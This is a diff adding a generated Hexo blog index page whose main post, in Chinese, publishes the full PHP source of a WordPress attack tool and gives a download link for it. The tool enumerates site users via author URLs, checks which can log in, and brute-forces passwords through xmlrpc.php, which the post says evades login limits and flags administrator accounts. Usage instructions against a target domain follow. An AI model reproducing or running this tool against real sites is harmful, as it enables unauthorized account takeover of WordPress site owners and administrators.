@@ -1,23 +1,3256 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-{% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
 
-{% block content %}
-  <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
-  </section>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/28/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/28/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/28/wordpress-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%EF%BC%8C%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/28/wordpress-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%EF%BC%8C%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">wordpress 用户枚举，爆破工具</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-28 10:24:47" itemprop="dateCreated datePublished" datetime="2017-11-28T10:24:47+08:00">2017-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:14" itemprop="dateModified" datetime="2020-10-11T11:53:14+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>web破解 一般喜欢用 burpsuite 、hydra 通用性好　但 一大堆参数　使用是还需配置</p>
+<p>破解wordpress 用wpscan 不得不说是很好用 功能多 而且经常更新　　但 不是每次跑wordpress 都开linux (ruby 各种蛋疼)</p>
+<p>1: 使用非常简单 无需其它参数</p>
+<pre><code>shell&gt;php scan.php http://www.target.com</code></pre>
+<p>或者是你的电脑装了php，并且配置了环境变量，就是可以在scan.php这个文件所在目录运行这段代码了。</p>
+<p>2：多线程（异步） 同时进行</p>
+<p>破完一个用户成功立即退出该任务 接着破另外一个用户</p>
+<p>3：自动生成用户名相关并加到字典头部</p>
+<p>大大的提高破解速度</p>
+<p>4：模块可单独使用</p>
+<p>5：枚举用户模块 能抓取大部分常规 wordpress站点用户</p>
+<p>检查枚举到的用户是否为登陆用户 如果不是则剔除 大大的提高破解效率</p>
+<p>6：该脚本 需curl 扩展支持</p>
+<p>7：利用wordpress 的xmlrpc.php 文件破解</p>
+<p>可绕过限制 并判断是否为管理员用户</p>
+<p>8、环境简单</p>
+<p>仅需 php.exe 、php5ts.dll 、curl.dll</p>
+<p>文件说明：</p>
+<pre><code>init.php 配置及功能函数
+enum_user.php 根据页面枚举用户
+chkuser.php 检测枚举到的用户是否为可登陆用户
+RollingCurl.php 多线程http请求类 （修改版）
+BruteWordPress.php 爆破类
+scan.php 主文件(要运行的文件)
+pass.list 高频率弱口令</code></pre>
+<p>init.php</p>
+<pre><code>&lt;?php
+function_exists(&#39;curl_init&#39;)? &#39;&#39; : die(&#39;cURL Must be installed for geturl function to work. Ask your host to enable it or uncomment extension=php_curl.dll in php.ini&#39;);
+ini_set(&#39;memory_limit&#39;, -1);
+date_default_timezone_set(&#39;PRC&#39;);
+define(&quot;wordlist&quot;,&#39;pass.list&#39;);
+define(&quot;max_user&quot;,10);// 最大列出用户数
+define(&quot;USERAGENT&quot;,&#39;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36&#39;);
+define(&quot;START_TIME&quot;, func_time());
+define(&quot;Thread&quot;,10); //设置线程
+define(&quot;TimeOut&quot;,5);//设置超时时间
+define(&quot;params&quot;,$argv[0]);
+define(&quot;target&quot;,$argv[1]);
+if(target)&#123;
+    $domain = trim(target);
+    define(&quot;domain&quot;,$domain);
+&#125;else&#123;
+
+    exit(&#39;php &#39;.params.&#39; http://192.168.0.108/wordpress/&#39;);
+&#125;
+
+require_once &#39;RollingCurl.php&#39;;
+
+function func_time() &#123;
+    list($microsec, $sec) = explode(&#39; &#39;, microtime());
+    return $microsec + $sec;
+&#125;
+
+
+/***
+*  计算执行时间
+*/
+function show_time()&#123;
+    echo str_repeat(&quot; &quot;, 50) . PHP_EOL . &#39;time: &#39; . round((func_time() - START_TIME), 4) . &#39; sec &#39; . PHP_EOL;
+&#125;
+?&gt;</code></pre>
+<p>enum_user.php</p>
+<pre><code>&lt;?php
+class EnumUser
+&#123;
+
+    private $rc;
+    private $names;
+    function __construct() &#123;
+        $this-&gt;nv = 0;
+        $this-&gt;rc = new RollingCurl();
+        $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc);
+        $this-&gt;rc-&gt;__set(&#39;window_size&#39;, Thread);
+        $this-&gt;rc-&gt;__set(&#39;time_out&#39;, TimeOut);
+    &#125;
+
+    function create_request_callback($rc) &#123;
+        return function ($response, $info, $request) use ($rc) &#123;
+            $pattern = &#39;/(author\/(.*)\/feed|&lt;body class=&quot;archive author author-([^\s]+))/&#39;;
+            if (preg_match($pattern, $response, $name)) &#123;
+                $c = count($name) - 1;
+                if (!empty($name[$c])) &#123;
+                    $this-&gt;names[] = $name[$c];
+                &#125; else &#123;
+
+                    $this-&gt;nv++;
+                &#125;
+            &#125;
+            if ($this-&gt;nv &gt;= 3) &#123;
+
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+        &#125;;
+    &#125;
+
+    function run() &#123;
+        global $a;
+        printf(&quot;[+] %s Enumerating usernames ...\r\n&quot;, date(&#39;h:i:s&#39;, time()));
+        for ($i = 1; $i &lt;= max_user; $i++) &#123;
+            $url = domain . &quot;/?author=&quot; . $i;
+            $request = new RollingCurlRequest($url);
+            $request-&gt;options = array(CURLOPT_USERAGENT =&gt; USERAGENT);
+            $this-&gt;rc-&gt;add($request);
+        &#125;
+        $this-&gt;rc-&gt;execute();
+
+        if (count($this-&gt;names) == 0) &#123;
+            exit(&#39;[-] Unable to find user!&#39;);
+        &#125;
+
+        echo &quot;[+] Find &quot; . count($this-&gt;names) . &#39; users&#39; . PHP_EOL;
+    &#125;
+
+    function result() &#123;
+
+        return $this-&gt;names;
+    &#125;
+&#125;
+?&gt;</code></pre>
+<p>chkuser.php</p>
+<pre><code>&lt;?php
+include &#39;init.php&#39;;
+class Chkuser
+&#123;
+
+    private $rc;
+    private $names;
+    function __construct() &#123;
+        $this-&gt;rc = new RollingCurl();
+        $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc);
+        $this-&gt;rc-&gt;__set(&#39;window_size&#39;, Thread);
+        $this-&gt;rc-&gt;__set(&#39;time_out&#39;, TimeOut);
+    &#125;
+
+    function create_request_callback($rc) &#123;
+        return function ($response, $info, $request) use ($rc) &#123;
+            if ($info[&#39;http_code&#39;] == 404 || $info[&#39;http_code&#39;] == 403 || $info[&#39;http_code&#39;] == 500) &#123;
+                echo &#39;[-] Access error!&#39; . PHP_EOL;
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+            preg_match(&#39;#log=(.+)&amp;pwd=#&#39;, $request-&gt;post_data, $out);
+            $user = $out[1];
+
+            if (stristr($response, &quot;&lt;strong&gt;&quot; . $user . &quot;&lt;/strong&gt;&quot;)) &#123;
+                $this-&gt;names[] = $user;
+            &#125;
+            if (stristr($response, &#39;Too many failed login attempts&#39;)) &#123;
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+        &#125;;
+    &#125;
+
+    function run() &#123;
+        include_once &#39;enum_user.php&#39;;
+        $collector = new EnumUser();
+        $collector-&gt;run();
+        $users = $collector-&gt;result();
+        printf(&quot;[+] %s Chkusers Loginname...\r\n&quot;, date(&#39;h:i:s&#39;, time()));
+        foreach ($users as $user) &#123;
+            $url = domain . &#39;/wp-login.php&#39;;
+            $post_data = &quot;log=&#123;$user&#125;&amp;pwd=UjP8XnFD4n3LzIjlax&quot;;
+            $request = new RollingCurlRequest($url, &#39;POST&#39;, $post_data);
+            $request-&gt;options = array(CURLOPT_USERAGENT =&gt; USERAGENT);
+            $this-&gt;rc-&gt;add($request);
+        &#125;
+        $this-&gt;rc-&gt;execute();
+        $counts = count($this-&gt;names);
+        if ($counts == 0) &#123;
+            echo &#39;[-] Warning Unable Check Loginuser!&#39; . PHP_EOL;
+            $this-&gt;names = $users;
+            $counts = count($this-&gt;names);
+        &#125;
+        echo &#39;login users:&#39; . PHP_EOL;
+        foreach ($this-&gt;names as $key =&gt; $u) &#123;
+
+            echo &quot;\t&quot; .iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$u) . PHP_EOL;
+        &#125;
+        printf(&quot;[+] %s Finded %d loginnames ... \r\n&quot;, date(&#39;h:i:s&#39;, time()), $counts);
+    &#125;
+
+    function result() &#123;
+
+        return $this-&gt;names;
+    &#125;
+&#125;
+?&gt;</code></pre>
+<p>RollingCurl.php</p>
+<pre><code>&lt;?php
+
+/*
+Authored by Josh Fraser (www.joshfraser.com)
+Released under Apache License 2.0
+
+Maintained by Alexander Makarov, http://rmcreative.ru/
+
+$Id$
+*/
+
+/**
+ * Class that represent a single curl request
+ */
+class RollingCurlRequest
+&#123;
+    public $url = false;
+    public $method = &#39;GET&#39;;
+    public $post_data = null;
+    public $headers = null;
+    public $options = null;
+
+    /**
+     * @param string $url
+     * @param string $method
+     * @param  $post_data
+     * @param  $headers
+     * @param  $options
+     * @return void
+     */
+    function __construct($url, $method = &quot;GET&quot;, $post_data = null, $headers = null, $options = null) &#123;
+        $this-&gt;url = $url;
+        $this-&gt;method = $method;
+        $this-&gt;post_data = $post_data;
+        $this-&gt;headers = $headers;
+        $this-&gt;options = $options;
+    &#125;
+
+    /**
+     * @return void
+     */
+    public function __destruct() &#123;
+        unset($this-&gt;url, $this-&gt;method, $this-&gt;post_data, $this-&gt;headers, $this-&gt;options);
+    &#125;
+&#125;
+
+/**
+ * RollingCurl custom exception
+ */
+class RollingCurlException extends Exception
+&#123;
+&#125;
+
+/**
+ * Class that holds a rolling queue of curl requests.
+ *
+ * @throws RollingCurlException
+ */
+class RollingCurl
+&#123;
+
+    /**
+     * @var int
+     *
+     * Window size is the max number of simultaneous connections allowed.
+     *
+     * REMEMBER TO RESPECT THE SERVERS:
+     * Sending too many requests at one time can easily be perceived
+     * as a DOS attack. Increase this window_size if you are making requests
+     * to multiple servers or have permission from the receving server admins.
+     */
+    private $window_size = 5;
+
+    /**
+     * @var float
+     *
+     * Timeout is the timeout used for curl_multi_select.
+     */
+    private $timeout = 10;
+
+    /**
+     * @var string|array
+     *
+     * Callback function to be applied to each result.
+     */
+    public $callback;
+
+    public $master = null;
+
+    public $requestList = array();
+
+    /**
+     * @var array
+     *
+     * Set your base options that you want to be used with EVERY request.
+     */
+    protected $options = array(CURLOPT_SSL_VERIFYPEER =&gt; 0, CURLOPT_RETURNTRANSFER =&gt; 1, CURLOPT_CONNECTTIMEOUT =&gt; 30, CURLOPT_TIMEOUT =&gt; 30);
+
+    /**
+     * @var array
+     */
+    private $headers = array();
+
+    /**
+     * @var Request[]
+     *
+     * The request queue
+     */
+    private $requests = array();
+
+    /**
+     * @var RequestMap[]
+     *
+     * Maps handles to request indexes
+     */
+    private $requestMap = array();
+
+    /**
+     * @param  $callback
+     * Callback function to be applied to each result.
+     *
+     * Can be specified as &#39;my_callback_function&#39;
+     * or array($object, &#39;my_callback_method&#39;).
+     *
+     * Function should take three parameters: $response, $info, $request.
+     * $response is response body, $info is additional curl info.
+     * $request is the original request
+     *
+     * @return void
+     */
+    function __construct($callback = null) &#123;
+        $this-&gt;callback = $callback;
+    &#125;
+
+    /**
+     * @param string $name
+     * @return mixed
+     */
+    public function __get($name) &#123;
+        return (isset($this-&gt;&#123;$name&#125;)) ? $this-&gt;&#123;$name&#125; : null;
+    &#125;
+
+    /**
+     * @param string $name
+     * @param mixed $value
+     * @return bool
+     */
+    public function __set($name, $value) &#123;
+
+        // append the base options &amp; headers
+        if ($name == &quot;options&quot; || $name == &quot;headers&quot;) &#123;
+            $this-&gt;&#123;$name&#125; = $value + $this-&gt;&#123;$name&#125;;
+        &#125; else &#123;
+            $this-&gt;&#123;$name&#125; = $value;
+        &#125;
+        return true;
+    &#125;
+
+    /**
+     * Add a request to the request queue
+     *
+     * @param Request $request
+     * @return bool
+     */
+    public function add($request) &#123;
+        $this-&gt;requests[] = $request;
+        return true;
+    &#125;
+
+    public function cancelRequests($all = true) &#123;
+        $this-&gt;requests = array();
+        if ($all) &#123;
+            foreach ($this-&gt;requestList as $handler) &#123;
+                curl_multi_remove_handle($this-&gt;master, $handler);
+            &#125;
+        &#125;
+        return true;
+    &#125;
+
+    /**
+     * Create new Request and add it to the request queue
+     *
+     * @param string $url
+     * @param string $method
+     * @param  $post_data
+     * @param  $headers
+     * @param  $options
+     * @return bool
+     */
+    public function request($url, $method = &quot;GET&quot;, $post_data = null, $headers = null, $options = null) &#123;
+        $this-&gt;requests[] = new RollingCurlRequest($url, $method, $post_data, $headers, $options);
+        return true;
+    &#125;
+
+    /**
+     * Perform GET request
+     *
+     * @param string $url
+     * @param  $headers
+     * @param  $options
+     * @return bool
+     */
+    public function get($url, $headers = null, $options = null) &#123;
+        return $this-&gt;request($url, &quot;GET&quot;, null, $headers, $options);
+    &#125;
+
+    /**
+     * Perform POST request
+     *
+     * @param string $url
+     * @param  $post_data
+     * @param  $headers
+     * @param  $options
+     * @return bool
+     */
+    public function post($url, $post_data = null, $headers = null, $options = null) &#123;
+        return $this-&gt;request($url, &quot;POST&quot;, $post_data, $headers, $options);
+    &#125;
+
+    /**
+     * Execute processing
+     *
+     * @param int $window_size Max number of simultaneous connections
+     * @return string|bool
+     */
+    public function execute($window_size = null) &#123;
+
+        // rolling curl window must always be greater than 1
+        if (sizeof($this-&gt;requests) == 1) &#123;
+            return $this-&gt;single_curl();
+        &#125; else &#123;
+
+            // start the rolling curl. window_size is the max number of simultaneous connections
+            return $this-&gt;rolling_curl($window_size);
+        &#125;
+    &#125;
+
+    /**
+     * Performs a single curl request
+     *
+     * @access private
+     * @return string
+     */
+    private function single_curl() &#123;
+        $ch = curl_init();
+        $request = array_shift($this-&gt;requests);
+        $options = $this-&gt;get_options($request);
+        curl_setopt_array($ch, $options);
+        $output = curl_exec($ch);
+        $info = curl_getinfo($ch);
+
+        // it&#39;s not neccesary to set a callback for one-off requests
+        if ($this-&gt;callback) &#123;
+            $callback = $this-&gt;callback;
+            if (is_callable($this-&gt;callback)) &#123;
+                call_user_func($callback, $output, $info, $request);
+            &#125;
+        &#125; else return $output;
+        return true;
+    &#125;
+
+    /**
+     * Performs multiple curl requests
+     *
+     * @access private
+     * @throws RollingCurlException
+     * @param int $window_size Max number of simultaneous connections
+     * @return bool
+     */
+    private function rolling_curl($window_size = null) &#123;
+        if ($window_size) $this-&gt;window_size = $window_size;
+
+        // make sure the rolling window isn&#39;t greater than the # of urls
+        if (sizeof($this-&gt;requests) &lt; $this-&gt;window_size) $this-&gt;window_size = sizeof($this-&gt;requests);
+
+        if ($this-&gt;window_size &lt; 2) &#123;
+            throw new RollingCurlException(&quot;Window size must be greater than 1&quot;);
+        &#125;
+
+        $this-&gt;master = curl_multi_init();
+
+        // start the first batch of requests
+        for ($i = 0; $i &lt; $this-&gt;window_size; $i++) &#123;
+            $ch = curl_init();
+
+            $options = $this-&gt;get_options($this-&gt;requests[$i]);
+
+            curl_setopt_array($ch, $options);
+            curl_multi_add_handle($this-&gt;master, $ch);
+            array_push($this-&gt;requestList, $ch);
+
+            // Add to our request Maps
+            $key = (string)$ch;
+            $this-&gt;requestMap[$key] = $i;
+        &#125;
+
+        do &#123;
+            while (($execrun = curl_multi_exec($this-&gt;master, $running)) == CURLM_CALL_MULTI_PERFORM);
+            if ($execrun != CURLM_OK) break;
+
+            // a request was just completed -- find out which one
+            while ($done = curl_multi_info_read($this-&gt;master)) &#123;
+
+                // get the info and content returned on the request
+                $info = curl_getinfo($done[&#39;handle&#39;]);
+                $output = curl_multi_getcontent($done[&#39;handle&#39;]);
+
+                // send the return values to the callback function.
+                $callback = $this-&gt;callback;
+                if (is_callable($callback)) &#123;
+                    $key = (string)$done[&#39;handle&#39;];
+                    $request = $this-&gt;requests[$this-&gt;requestMap[$key]];
+                    unset($this-&gt;requestMap[$key]);
+                    call_user_func($callback, $output, $info, $request);
+                &#125;
+
+                // start a new request (it&#39;s important to do this before removing the old one)
+                if ($i &lt; sizeof($this-&gt;requests) &amp;&amp; isset($this-&gt;requests[$i]) &amp;&amp; $i &lt; count($this-&gt;requests)) &#123;
+                    $ch = curl_init();
+                    $options = $this-&gt;get_options($this-&gt;requests[$i]);
+                    curl_setopt_array($ch, $options);
+                    curl_multi_add_handle($this-&gt;master, $ch);
+                    array_push($this-&gt;requestList, $ch);
+
+                    // Add to our request Maps
+                    $key = (string)$ch;
+                    $this-&gt;requestMap[$key] = $i;
+                    $i++;
+                &#125;
+
+                // remove the curl handle that just completed
+                curl_multi_remove_handle($this-&gt;master, $done[&#39;handle&#39;]);
+            &#125;
+
+            // Block for data in / output; error handling is done by curl_multi_exec
+            if ($running) curl_multi_select($this-&gt;master, $this-&gt;timeout);
+        &#125;
+        while ($running);
+        curl_multi_close($this-&gt;master);
+        return true;
+    &#125;
+
+    /**
+     * Helper function to set up a new request by setting the appropriate options
+     *
+     * @access private
+     * @param Request $request
+     * @return array
+     */
+    private function get_options($request) &#123;
+
+        // options for this entire curl object
+        $options = $this-&gt;__get(&#39;options&#39;);
+        if (ini_get(&#39;safe_mode&#39;) == &#39;Off&#39; || !ini_get(&#39;safe_mode&#39;)) &#123;
+            $options[CURLOPT_FOLLOWLOCATION] = 1;
+            $options[CURLOPT_MAXREDIRS] = 5;
+        &#125;
+        $headers = $this-&gt;__get(&#39;headers&#39;);
+
+        // append custom options for this specific request
+        if ($request-&gt;options) &#123;
+            $options = $request-&gt;options + $options;
+        &#125;
+
+        // set the request URL
+        $options[CURLOPT_URL] = $request-&gt;url;
+
+        // posting data w/ this request?
+        if ($request-&gt;post_data) &#123;
+            $options[CURLOPT_POST] = 1;
+            $options[CURLOPT_POSTFIELDS] = $request-&gt;post_data;
+        &#125;
+        if ($headers) &#123;
+            $options[CURLOPT_HEADER] = 0;
+            $options[CURLOPT_HTTPHEADER] = $headers;
+        &#125;
+
+        return $options;
+    &#125;
+
+    /**
+     * @return void
+     */
+    public function __destruct() &#123;
+        unset($this-&gt;window_size, $this-&gt;callback, $this-&gt;options, $this-&gt;headers, $this-&gt;requests);
+    &#125;
+&#125;</code></pre>
+<p>BruteWordPress.php</p>
+<pre><code>&lt;?php
+include &#39;init.php&#39;;
+define(&quot;user&quot;, $argv[2]);
+class BruteWordPress
+&#123;
+    private $rc;
+    function __construct() &#123;
+        $this-&gt;rc = new RollingCurl();
+        $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc);
+        $this-&gt;rc-&gt;__set(&#39;window_size&#39;, Thread);
+        $this-&gt;rc-&gt;__set(&#39;time_out&#39;, TimeOut);
+    &#125;
+
+    function create_request_callback($rc) &#123;
+        return function ($response, $info, $request) use ($rc) &#123;
+            if ($info[&#39;http_code&#39;] == 404 || $info[&#39;http_code&#39;] == 403 || $info[&#39;http_code&#39;] == 500) &#123;
+                echo &#39;[-] Access error!&#39; . PHP_EOL;
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+
+            $p = $request-&gt;post_data;
+            preg_match_all(&#39;/&lt;param&gt;&lt;value&gt;([^\s]+?)&lt;\/value&gt;&lt;\/param&gt;/&#39;, $p, $m);
+            $user = $m[1][0];
+            $pass = $m[1][1];
+            if (!preg_match(&#39;/&lt;boolean&gt;(\d)&lt;\/boolean&gt;/&#39;, $response, $is_admin)) &#123;
+
+                //echo &#39;[*] Brote user &#39; . $user . &quot; ...&quot; . &quot;\r&quot;;
+
+
+            &#125; else &#123;
+
+                //print_r($is_admin).PHP_EOL;
+                if ($is_admin[1] == 1) &#123;
+                    echo &#39;[+] Bruteed~ -&gt; &#39; . iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$user)  . &#39;:&#39; . $pass . &#39; [is admin]&#39; . PHP_EOL;
+                    $this-&gt;rc-&gt;cancelRequests();
+                &#125; else &#123;
+                    echo &#39;[+] Bruteed~ -&gt; &#39; . iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$user)  . &#39;:&#39; . $pass . PHP_EOL;
+                    $this-&gt;rc-&gt;cancelRequests();
+                &#125;
+            &#125;
+        &#125;;
+    &#125;
+
+    function run() &#123;
+        $pass_file = preg_replace(&#39;/\s$/&#39;, &quot;&quot;, file(wordlist));
+        $user_pre = array(&#39;123&#39;, &#39;111&#39;, &#39;1&#39;, &#39;a&#39;, &#39;pass&#39;, &#39;!@#&#39;, &#39;password&#39;, &#39;abc&#39;, &#39;1961&#39;, &#39;1962&#39;, &#39;1963&#39;, &#39;1970&#39;, &#39;1988&#39;, &#39;1989&#39;, &#39;1990&#39;, &#39;1991&#39;, &#39;1992&#39;, &#39;1993&#39;, &#39;1994&#39;, &#39;1995&#39;, &#39;1996&#39;, &#39;1997&#39;, &#39;1998&#39;, &#39;1999&#39;, &#39;2001&#39;, &#39;2002&#39;, &#39;2003&#39;, &#39;2004&#39;, &#39;2006&#39;, &#39;2005&#39;, &#39;2007&#39;, &#39;2008&#39;, &#39;2009&#39;, &#39;2010&#39;, &#39;2011&#39;, &#39;2012&#39;, &#39;2013&#39;, &#39;2014&#39;, &#39;2015&#39;);
+        foreach ($user_pre as $pre) &#123;
+            $pre_u[] = user . $pre;
+        &#125;
+        $p = array_merge($pre_u, $pass_file);
+        $passwords = array_unique($p);
+        array_unshift($passwords, user);
+
+        foreach ($passwords as $pass) &#123;
+            $url = domain . &#39;/xmlrpc.php&#39;;
+            $post_data = sprintf(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&#39;, user, $pass);
+            $request = new RollingCurlRequest($url, &#39;POST&#39;, $post_data);
+            $request-&gt;options = array(CURLOPT_USERAGENT =&gt; USERAGENT);
+            $this-&gt;rc-&gt;add($request);
+        &#125;
+        $this-&gt;rc-&gt;execute();
+    &#125;
+&#125;
+
+$brute = new BruteWordPress();
+$brute-&gt;run();
+?&gt;</code></pre>
+<p>scan.php</p>
+<pre><code>&lt;?php
+include &#39;chkuser.php&#39;;
+
+$chk = new Chkuser();
+$chk-&gt;run();
+$user_arr = $chk-&gt;result();
+
+//print_r($user_arr);
+
+function broter($user) &#123;
+
+    system(&#39;php BruteWordPress.php &#39; . target . &#39; &#39; . $user);
+&#125;
+printf(&quot;[+] %s Broting...\r\n&quot;, date(&#39;h:i:s&#39;, time()));
+foreach ($user_arr as $user) &#123;
+    echo &#39;[*] Brute user &#39; . iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$user). &quot; ...&quot; . str_repeat(&#39; &#39;, 60) . &quot;\r&quot;;
+    broter($user);
+&#125;
+show_time();
+?&gt;</code></pre>
+<h2 id="打包下载"><a href="#打包下载" class="headerlink" title="打包下载"></a>打包下载</h2><p>文章引用来自：<a target="_blank" rel="noopener" href="http://www.uedbox.com/brutewordpress-scan/">体验盒子 | 关注网络安全</a>，请大家支持原创</p>
+<p>链接:<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1jIMQPq2">http://pan.baidu.com/s/1jIMQPq2</a> ，密码：o5q3</p>
+<p>使用方法很简单：下载这个资源，然后在scan.php所在文件夹下运行命令：</p>
+<pre><code>php scan.php http://www.targetdomain.com</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/25/%E5%AE%89%E8%A3%85wordpress%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
